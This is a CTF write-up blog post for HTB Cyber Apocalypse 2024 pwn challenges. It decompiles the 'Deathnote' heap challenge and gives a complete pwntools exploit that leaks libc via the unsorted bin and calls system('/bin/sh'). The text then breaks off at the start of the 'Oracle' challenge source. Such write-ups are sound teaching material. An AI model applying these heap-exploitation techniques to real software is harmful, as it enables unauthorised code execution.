<!DOCTYPE html>
<html lang="en">
<head>
  
    <title>Cyber Apocalypse 2024: Hacker Royale :: Av&#39;s Blog</title>
  
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="description" content="PWN challenge Writeups for HTB CTF 2024" />
<meta name="keywords" content=", " />

  <meta name="robots" content="noodp" />

<link rel="canonical" href="https://0xAtharv.github.io/posts/cyber-apocalypse-2024-hacker-royale/" />






  
  
  
  
  
  <link rel="stylesheet" href="https://0xAtharv.github.io/styles.css">







  <link rel="shortcut icon" href="https://0xAtharv.github.io/img/theme-colors/red.png">
  <link rel="apple-touch-icon" href="https://0xAtharv.github.io/img/theme-colors/red.png">



<meta name="twitter:card" content="summary" />

  
    <meta name="twitter:site" content="https://twitter.com/0xAtharv" />
  
    <meta name="twitter:creator" content="0xAtharv" />



<meta property="og:locale" content="en" />
<meta property="og:type" content="article" />
<meta property="og:title" content="Cyber Apocalypse 2024: Hacker Royale">
<meta property="og:description" content="PWN challenge Writeups for HTB CTF 2024" />
<meta property="og:url" content="https://0xAtharv.github.io/posts/cyber-apocalypse-2024-hacker-royale/" />
<meta property="og:site_name" content="Av&#39;s Blog" />

  
  
  <meta property="og:image" content="https://0xAtharv.github.io/">

<meta property="og:image:width" content="1200">
<meta property="og:image:height" content="627">


  <meta property="article:published_time" content="2024-03-18 20:33:30 &#43;0530 IST" />












</head>
<body class="red">


<div class="container center headings--one-size">

  <header class="header">
  <div class="header__inner">
    <div class="header__logo">
      <a href="/">
  <div class="logo">
    Av&#39;s Blog
  </div>
</a>

    </div>
    
      <ul class="menu menu--mobile">
  <li class="menu__trigger">Menu&nbsp;â–¾</li>
  <li>
    <ul class="menu__dropdown">
      
        
          <li><a href="/about">About</a></li>
        
      
        
          <li><a href="/posts">Posts</a></li>
        
      
      
    </ul>
  </li>
</ul>

    
    
  </div>
  
    <nav class="navigation-menu">
  <ul class="navigation-menu__inner menu--desktop">
    
      
        
          <li><a href="/about" >About</a></li>
        
      
        
          <li><a href="/posts" >Posts</a></li>
        
      
      
    
  </ul>
</nav>

  
</header>


  <div class="content">
    
<article class="post">
  <h1 class="post-title">
    <a href="https://0xAtharv.github.io/posts/cyber-apocalypse-2024-hacker-royale/">Cyber Apocalypse 2024: Hacker Royale</a>
  </h1>
  <div class="post-meta"><time class="post-date">2024-03-18</time><span class="post-author">0xAtharv</span></div>

  
    <span class="post-tags">
      
      #<a href="https://0xAtharv.github.io/tags/pwn/">pwn</a>&nbsp;
      
      #<a href="https://0xAtharv.github.io/tags/htb/">htb</a>&nbsp;
      
      #<a href="https://0xAtharv.github.io/tags/htbctf/">htbctf</a>&nbsp;
      
      #<a href="https://0xAtharv.github.io/tags/htbctf2024/">htbctf2024</a>&nbsp;
      
    </span>
  
  


  
    <div class="table-of-contents">
      <h2>
        Table of Contents
      </h2>
      <nav id="TableOfContents">
  <ul>
    <li><a href="#pwn-challenge-deathnote-hard">Pwn Challenge Deathnote [Hard]</a>
      <ul>
        <li><a href="#decompiled-code">Decompiled Code</a></li>
        <li><a href="#exploit-strategy">Exploit Strategy</a></li>
        <li><a href="#exploit">Exploit</a></li>
      </ul>
    </li>
    <li><a href="#pwn-challenge-oracle-hard">Pwn Challenge Oracle [Hard]</a>
      <ul>
        <li><a href="#oraclec">oracle.c</a></li>
        <li><a href="#initial-analysis">Initial-Analysis</a></li>
        <li><a href="#bugs">Bugs</a></li>
        <li><a href="#exploit-strategy-1">Exploit Strategy</a></li>
        <li><a href="#initial-exploit">Initial Exploit</a></li>
      </ul>
    </li>
    <li><a href="#final-exploit">Final Exploit</a>
      <ul>
        <li><a href="#output">Output</a></li>
      </ul>
    </li>
    <li><a href="#gloater-insane">Gloater [insane]</a></li>
    <li><a href="#mist-in-maze">Mist in Maze</a></li>
    <li><a href="#sos">sos</a></li>
  </ul>
</nav>
    </div>
  

  <div class="post-content"><div>
        <p><img src="/images/htbctf-rank.png"></p>
<p><strong>So our Team L3ak played HTB CTF , which lasted for 5 long days . Everyone from our team stepped up and we secured 14th place out of 5694 teams !!</strong>
<strong>All my Teammates are absolute legends !</strong></p>
<h2 id="pwn-challenge-deathnote-hard">Pwn Challenge Deathnote [Hard]<a href="#pwn-challenge-deathnote-hard" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
<p>By looking at the challenge we can guess its a Menu-Based Heap Challenge.</p>
<p><img src="/images/deathnote_prompt.png"></p>
<p>We have 4 options in the menu: Create , Delete , Show and a mystery option (42)</p>
<h3 id="decompiled-code">Decompiled Code<a href="#decompiled-code" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">void</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  ulong user_inp;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">long</span> in_FS_OFFSET;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span>  global_ptr_array[<span style="color:#ae81ff">10</span>]<span style="color:#f92672">=</span>{<span style="color:#ae81ff">0x0</span>};   
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  undefined8 canary;
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>  canary <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>(undefined8 <span style="color:#f92672">*</span>)(in_FS_OFFSET <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x28</span>);
</span></span><span style="display:flex;"><span>LAB_00101a48:
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">while</span> (user_inp <span style="color:#f92672">=</span> <span style="color:#a6e22e">menu</span>(), user_inp <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x2a</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">_</span>(<span style="color:#f92672">&amp;</span>global_ptr_array);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (user_inp <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0x2b</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (user_inp <span style="color:#f92672">==</span> <span style="color:#ae81ff">3</span>) {
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">show</span>(<span style="color:#f92672">&amp;</span>global_ptr_array);
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">goto</span> LAB_00101a48;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (user_inp <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">4</span>) {
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> (user_inp <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">add</span>(<span style="color:#f92672">&amp;</span>global_ptr_array);
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (user_inp <span style="color:#f92672">!=</span> <span style="color:#ae81ff">2</span>) <span style="color:#66d9ef">goto</span> LAB_00101a38;
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">delete</span>(<span style="color:#f92672">&amp;</span>global_ptr_array);
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">goto</span> LAB_00101a48;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>LAB_00101a38:
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">error</span>(<span style="color:#e6db74">&#34;Invalid choice!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">goto</span> LAB_00101a48;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">add</span>(<span style="color:#66d9ef">long</span> param_1)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">long</span> canary;
</span></span><span style="display:flex;"><span>  byte page_idx;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> bool_idx;
</span></span><span style="display:flex;"><span>  ushort page_size;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>pvVar5;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">long</span> in_FS_OFFSET;
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>  canary <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>(<span style="color:#66d9ef">long</span> <span style="color:#f92672">*</span>)(in_FS_OFFSET <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x28</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">get_empty_note</span>(param_1);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>(<span style="color:#f92672">&amp;</span>DAT_00102658);
</span></span><span style="display:flex;"><span>  page_size <span style="color:#f92672">=</span> <span style="color:#a6e22e">read_num</span>();
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ((page_size <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">2</span>) <span style="color:#f92672">||</span> (<span style="color:#ae81ff">0x80</span> <span style="color:#f92672">&lt;</span> page_size)) {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">error</span>(<span style="color:#e6db74">&#34;Don</span><span style="color:#ae81ff">\&#39;</span><span style="color:#e6db74">t play with me!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#f92672">&amp;</span>DAT_0010268e);
</span></span><span style="display:flex;"><span>    page_idx <span style="color:#f92672">=</span> <span style="color:#a6e22e">read_num</span>();
</span></span><span style="display:flex;"><span>    bool_idx <span style="color:#f92672">=</span> <span style="color:#a6e22e">check_idx</span>(page_idx);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (bool_idx <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;\x01&#39;</span>) {
</span></span><span style="display:flex;"><span>      pvVar5 <span style="color:#f92672">=</span> <span style="color:#a6e22e">malloc</span>((ulong)page_size);
</span></span><span style="display:flex;"><span>      <span style="color:#f92672">*</span>(<span style="color:#66d9ef">void</span> <span style="color:#f92672">**</span>)((ulong)page_idx <span style="color:#f92672">*</span> <span style="color:#ae81ff">8</span> <span style="color:#f92672">+</span> param_1) <span style="color:#f92672">=</span> pvVar5;
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">printf</span>(<span style="color:#f92672">&amp;</span>DAT_0010269c);
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">read</span>(<span style="color:#ae81ff">0</span>,<span style="color:#f92672">*</span>(<span style="color:#66d9ef">void</span> <span style="color:#f92672">**</span>)(param_1 <span style="color:#f92672">+</span> (ulong)page_idx <span style="color:#f92672">*</span> <span style="color:#ae81ff">8</span>),(<span style="color:#66d9ef">long</span>)(<span style="color:#66d9ef">int</span>)(page_size <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>));
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;%s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">[!] The fate of the victim has been sealed!%s</span><span style="color:#ae81ff">\n\n</span><span style="color:#e6db74">&#34;</span>,<span style="color:#f92672">&amp;</span>DAT_001026b4,<span style="color:#f92672">&amp;</span>DAT_00102008);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (canary <span style="color:#f92672">!=</span> <span style="color:#f92672">*</span>(<span style="color:#66d9ef">long</span> <span style="color:#f92672">*</span>)(in_FS_OFFSET <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x28</span>)) {
</span></span><span style="display:flex;"><span>                    <span style="color:#75715e">/* WARNING: Subroutine does not return */</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">__stack_chk_fail</span>();
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>We can add chunks from size 0x2 and 0x80 and assign them specific indexes .</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">_</span>(<span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>param_1)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">long</span> canary;
</span></span><span style="display:flex;"><span>  code <span style="color:#f92672">*</span>user_function_ptr;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">long</span> in_FS_OFFSET;
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>  canary <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>(<span style="color:#66d9ef">long</span> <span style="color:#f92672">*</span>)(in_FS_OFFSET <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x28</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x1b</span><span style="color:#e6db74">[1;33m&#34;</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">cls</span>();
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>(<span style="color:#f92672">&amp;</span>DAT_00102750,<span style="color:#f92672">&amp;</span>DAT_00102010,<span style="color:#f92672">&amp;</span>DAT_001026b4,<span style="color:#f92672">&amp;</span>DAT_00102010,<span style="color:#f92672">&amp;</span>DAT_001026b4,<span style="color:#f92672">&amp;</span>DAT_00102008);
</span></span><span style="display:flex;"><span>  user_function_ptr <span style="color:#f92672">=</span> (code <span style="color:#f92672">*</span>)<span style="color:#a6e22e">strtoull</span>(<span style="color:#f92672">*</span>param_1,(<span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>)<span style="color:#ae81ff">0x0</span>,<span style="color:#ae81ff">0x10</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (((user_function_ptr <span style="color:#f92672">==</span> (code <span style="color:#f92672">*</span>)<span style="color:#ae81ff">0x0</span>) <span style="color:#f92672">&amp;&amp;</span> (<span style="color:#f92672">**</span>param_1 <span style="color:#f92672">!=</span> <span style="color:#e6db74">&#39;0&#39;</span>)) <span style="color:#f92672">&amp;&amp;</span> ((<span style="color:#f92672">*</span>param_1)[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">!=</span> <span style="color:#e6db74">&#39;x&#39;</span>)) {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;Error: Invalid hexadecimal string&#34;</span>);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ((<span style="color:#f92672">*</span>param_1 <span style="color:#f92672">==</span> (<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)<span style="color:#ae81ff">0x0</span>) <span style="color:#f92672">||</span> (param_1[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">==</span> (<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)<span style="color:#ae81ff">0x0</span>)) {
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">error</span>(<span style="color:#e6db74">&#34;What you are trying to do is unacceptable!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>                    <span style="color:#75715e">/* WARNING: Subroutine does not return */</span>
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">exit</span>(<span style="color:#ae81ff">0x520</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">puts</span>(<span style="color:#f92672">&amp;</span>DAT_00102848);
</span></span><span style="display:flex;"><span>    (<span style="color:#f92672">*</span>user_function_ptr)(param_1[<span style="color:#ae81ff">1</span>]);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (canary <span style="color:#f92672">!=</span> <span style="color:#f92672">*</span>(<span style="color:#66d9ef">long</span> <span style="color:#f92672">*</span>)(in_FS_OFFSET <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x28</span>)) {
</span></span><span style="display:flex;"><span>                    <span style="color:#75715e">/* WARNING: Subroutine does not return */</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">__stack_chk_fail</span>();
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>This <code>_</code> function takes a pointer to array of pointers .The function takes the 0th index as a hexadecimal string which means the string needs to start with <code>0x</code>  and then it converts the string to a unsigned long and then calls it as a function with the 1st index as the argument like so :</p>
<pre tabindex="0"><code>            0               1
----------------------------------------
|  function pointer |      arg         |
----------------------------------------
</code></pre><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>(<span style="color:#f92672">*</span>user_function_ptr)(param_1[<span style="color:#ae81ff">1</span>]);
</span></span></code></pre></div><p>Delete and Show functions</p>
<ul>
<li>delete(): Delete allows us to free() a chunk at the any index which is not freed , once freed it clears that index at the global array.</li>
<li>show(): It prints the content of the specified chunk</li>
</ul>
<h3 id="exploit-strategy">Exploit Strategy<a href="#exploit-strategy" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
<p>So we need to leak a libc pointer to resolve the address of <code>system()</code> what we can do is create 10 chunks ( maximum chunks which can be created) of size 0x80 we free 9 of those. first 7 will go in the tcache[0x80] and last 2 will go to the unsorted bin so they will have pointers to libc</p>
<p>we can now view chunk 7 with show() and voila ! we have a libc leak</p>
<p>Now we can calculate address of system() and use it in out <code>_()</code> function</p>
<h3 id="exploit">Exploit<a href="#exploit" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># context.log_level=&#39;debug&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>libc <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./glibc/libc.so.6&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">create</span>(size,page,content):
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xf0\x9f\x92\x80</span><span style="color:#e6db74">&#34;</span>,size)<span style="color:#75715e"># &#34;\xf0\x9f\x92\x80&#34; == ðŸ’€</span>
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xf0\x9f\x92\x80</span><span style="color:#e6db74">&#34;</span>,page)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xf0\x9f\x92\x80</span><span style="color:#e6db74">&#34;</span>,content)
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">delete</span>(idx):
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xf0\x9f\x92\x80</span><span style="color:#e6db74">&#34;</span>,<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;2&#34;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;?</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,str(idx))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">=</span>process(<span style="color:#e6db74">&#34;./deathnote&#34;</span>)
</span></span><span style="display:flex;"><span><span style="color:#75715e"># p=remote(&#39;remote_ip&#39;,remote_port)</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">0x7</span>):
</span></span><span style="display:flex;"><span>    create(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;0x80&#34;</span>,str(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>i<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>),str(<span style="color:#ae81ff">0x41</span><span style="color:#f92672">+</span>i)<span style="color:#f92672">*</span><span style="color:#ae81ff">0x30</span>)  <span style="color:#75715e">#  chunks for tcache </span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>create(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;0x80&#34;</span>,str(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;7&#34;</span>),str(<span style="color:#ae81ff">0x41</span><span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>)<span style="color:#f92672">*</span><span style="color:#ae81ff">0x30</span>) <span style="color:#75715e"># 2 chunks for unsortedbin </span>
</span></span><span style="display:flex;"><span>create(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;0x80&#34;</span>,str(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;8&#34;</span>),str(<span style="color:#ae81ff">0x41</span><span style="color:#f92672">+</span><span style="color:#ae81ff">2</span>)<span style="color:#f92672">*</span><span style="color:#ae81ff">0x30</span>)
</span></span><span style="display:flex;"><span>create(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;0x80&#34;</span>,str(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;9&#34;</span>),str(<span style="color:#ae81ff">0x41</span><span style="color:#f92672">+</span><span style="color:#ae81ff">3</span>)<span style="color:#f92672">*</span><span style="color:#ae81ff">0x30</span>) <span style="color:#75715e"># chunk to avoid heap consolidation  </span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">0x7</span>):
</span></span><span style="display:flex;"><span>    delete(str(i)) <span style="color:#75715e"># fill tcache</span>
</span></span><span style="display:flex;"><span> 
</span></span><span style="display:flex;"><span>delete(str(<span style="color:#e6db74">&#34;7&#34;</span>))
</span></span><span style="display:flex;"><span>delete(str(<span style="color:#e6db74">&#34;8&#34;</span>)) <span style="color:#75715e"># send chunks to unsortedbin</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xf0\x9f\x92\x80</span><span style="color:#e6db74">&#34;</span>,<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;3&#39;</span>)
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xf0\x9f\x92\x80</span><span style="color:#e6db74">&#34;</span>,<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;7&#39;</span>) <span style="color:#75715e"># show() 7th chunk</span>
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;: &#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>libc_base <span style="color:#f92672">=</span> u64(p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)[:<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">8</span>,<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\0</span><span style="color:#e6db74">&#39;</span>)) <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x21ace0</span> <span style="color:#75715e"># calcualate libc base </span>
</span></span><span style="display:flex;"><span>system<span style="color:#f92672">=</span>libc_base<span style="color:#f92672">+</span>libc<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#39;system&#39;</span>]
</span></span><span style="display:flex;"><span>binsh<span style="color:#f92672">=</span>libc_base <span style="color:#f92672">+</span><span style="color:#ae81ff">0x1d8678</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#39;system: &#39;</span><span style="color:#f92672">+</span>hex(system)<span style="color:#f92672">+</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>)
</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#39;binsh: &#39;</span><span style="color:#f92672">+</span>hex(binsh)<span style="color:#f92672">+</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>create(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;100&#34;</span>,<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;0&#34;</span>,hex(system)) <span style="color:#75715e"># create the 0th and 1st chunk for _(); </span>
</span></span><span style="display:flex;"><span>create(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;100&#34;</span>,<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;1&#34;</span>,<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;/bin/sh&#34;</span>) 
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xf0\x9f\x92\x80</span><span style="color:#e6db74">&#34;</span>,<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;42&#39;</span>) <span style="color:#75715e"># call system(&#34;/bin/sh&#34;)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>interactive()
</span></span></code></pre></div><p><img alt="ezz_test" src="/images/its-just-too-easy-bro-dripboolin.gif"></p>
<h2 id="pwn-challenge-oracle-hard">Pwn Challenge Oracle [Hard]<a href="#pwn-challenge-oracle-hard" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
<p>we are given the source code of this challenge :</p>
<h3 id="oraclec">oracle.c<a href="#oraclec" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#75715e">// gcc oracle.c -o oracle -fno-stack-protector
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;string.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;unistd.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;sys/types.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;sys/socket.h&gt;</span><span style="color:#75715e">
